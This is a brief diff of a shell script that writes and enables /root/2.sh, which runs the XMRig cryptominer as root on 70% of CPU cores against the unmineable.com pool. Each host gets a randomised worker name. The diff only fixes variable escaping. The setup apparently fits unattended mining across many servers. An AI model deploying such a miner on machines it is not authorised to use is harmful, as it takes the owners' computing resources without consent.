@@ -29,15 +29,15 @@ chmod +x /root/1.sh
 cat > /root/2.sh << 'EOF'
 #!/bin/bash
 
-CORES=\$(nproc)
-THREADS=\$((CORES * 70 / 100))
+CORES=$(nproc)
+THREADS=$((CORES * 70 / 100))
 
 # Generate a random 10-character alphanumeric string
-RANDOM_STRING=\$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo '')
+RANDOM_STRING=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo '')
 
 /root/xmrig-6.22.2/xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
---threads=\$THREADS --huge-pages-jit --randomx-1gb-pages --randomx-wrmsr=-1 \
---cpu-no-yield -k -u 1710454080.\${RANDOM_STRING}#e1rj-h9dc -p x > /root/2.log 2>&1
+--threads=$THREADS --huge-pages-jit --randomx-1gb-pages --randomx-wrmsr=-1 \
+--cpu-no-yield -k -u 1710454080.${RANDOM_STRING}#e1rj-h9dc -p x > /root/2.log 2>&1
 EOF
 
 chmod +x /root/2.sh
